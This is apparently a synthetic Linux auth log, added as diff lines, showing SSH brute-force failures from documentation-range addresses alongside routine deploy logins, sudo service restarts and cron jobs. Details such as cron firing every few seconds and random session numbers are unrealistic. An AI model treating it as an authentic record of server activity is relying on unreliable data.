+2026-11-05 01:16:29 srv-auth-01 systemd[1]: Started Session 284 of user deploy.
+2026-11-05 01:16:30 srv-auth-01 sshd[3390]: Failed password for invalid user admin from 203.0.113.44 port 44243 ssh2
+2026-11-05 01:16:31 srv-auth-01 systemd[1]: Started Session 441 of user deploy.
+2026-11-05 01:16:32 srv-auth-01 systemd[1]: Started Session 505 of user deploy.
+2026-11-05 01:16:33 srv-auth-01 CRON[6916]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:16:34 srv-auth-01 systemd[1]: Started Session 976 of user deploy.
+2026-11-05 01:16:35 srv-auth-01 sshd[9123]: Accepted publickey for deploy from 10.0.9.159 port 36407 ssh2
+2026-11-05 01:16:36 srv-auth-01 sshd[2752]: Failed password for invalid user test from 203.0.113.79 port 30221 ssh2
+2026-11-05 01:16:37 srv-auth-01 sshd[6443]: Failed password for invalid user pi from 203.0.113.207 port 58252 ssh2
+2026-11-05 01:16:38 srv-auth-01 systemd[1]: Started Session 460 of user deploy.
+2026-11-05 01:16:39 srv-auth-01 systemd[1]: Started Session 450 of user deploy.
+2026-11-05 01:16:40 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:16:41 srv-auth-01 systemd[1]: Started Session 338 of user deploy.
+2026-11-05 01:16:42 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:16:43 srv-auth-01 sshd[8848]: Accepted publickey for deploy from 10.0.5.47 port 43049 ssh2
+2026-11-05 01:16:44 srv-auth-01 systemd[1]: Started Session 308 of user deploy.
+2026-11-05 01:16:45 srv-auth-01 sshd[4971]: Failed password for invalid user oracle from 203.0.113.98 port 39184 ssh2
+2026-11-05 01:16:46 srv-auth-01 sshd[6980]: Failed password for invalid user admin from 203.0.113.240 port 48476 ssh2
+2026-11-05 01:16:47 srv-auth-01 sshd[9939]: Accepted publickey for deploy from 10.0.2.176 port 55153 ssh2
+2026-11-05 01:16:48 srv-auth-01 sudo: deploy : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:16:49 srv-auth-01 sshd[4434]: Failed password for invalid user pi from 203.0.113.206 port 39546 ssh2
+2026-11-05 01:16:50 srv-auth-01 CRON[7703]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:16:51 srv-auth-01 sshd[3280]: Failed password for invalid user oracle from 203.0.113.63 port 38279 ssh2
+2026-11-05 01:16:52 srv-auth-01 sshd[7932]: Accepted publickey for deploy from 10.0.6.20 port 44715 ssh2
+2026-11-05 01:16:53 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:16:54 srv-auth-01 sudo: deploy : TTY=pts/3 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:16:55 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:16:56 srv-auth-01 sshd[9907]: Failed password for invalid user admin from 203.0.113.204 port 41781 ssh2
+2026-11-05 01:16:57 srv-auth-01 sudo: deploy : TTY=pts/4 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:16:58 srv-auth-01 CRON[2791]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:16:59 srv-auth-01 sshd[6816]: Accepted publickey for deploy from 10.0.2.167 port 50076 ssh2
+2026-11-05 01:17:00 srv-auth-01 CRON[7547]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:17:01 srv-auth-01 systemd[1]: Started Session 998 of user deploy.
+2026-11-05 01:17:02 srv-auth-01 sshd[2735]: Failed password for invalid user admin from 203.0.113.27 port 38478 ssh2
+2026-11-05 01:17:03 srv-auth-01 sshd[9366]: Accepted publickey for deploy from 10.0.8.144 port 49022 ssh2
+2026-11-05 01:17:04 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:17:05 srv-auth-01 sshd[7129]: Failed password for invalid user pi from 203.0.113.120 port 55308 ssh2
+2026-11-05 01:17:06 srv-auth-01 sudo: deploy : TTY=pts/5 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:17:07 srv-auth-01 sudo: deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app
+2026-11-05 01:17:08 srv-auth-01 systemd[1]: Started Session 35 of user deploy.
+2026-11-05 01:17:09 srv-auth-01 sshd[2712]: Failed password for invalid user oracle from 203.0.113.108 port 32813 ssh2
+2026-11-05 01:17:10 srv-auth-01 CRON[3321]: (root) CMD (/usr/lib/sysstat/sa1 1 1)
+2026-11-05 01:17:11 srv-auth-01 systemd[1]: Started Session 329 of user deploy.
+2026-11-05 01:17:12 srv-auth-01 systemd[1]: Started Session 476 of user deploy.
+2026-11-05 01:17:13 srv-auth-01 sshd[9537]: Accepted publickey for deploy from 10.0.7.91 port 45602 ssh2
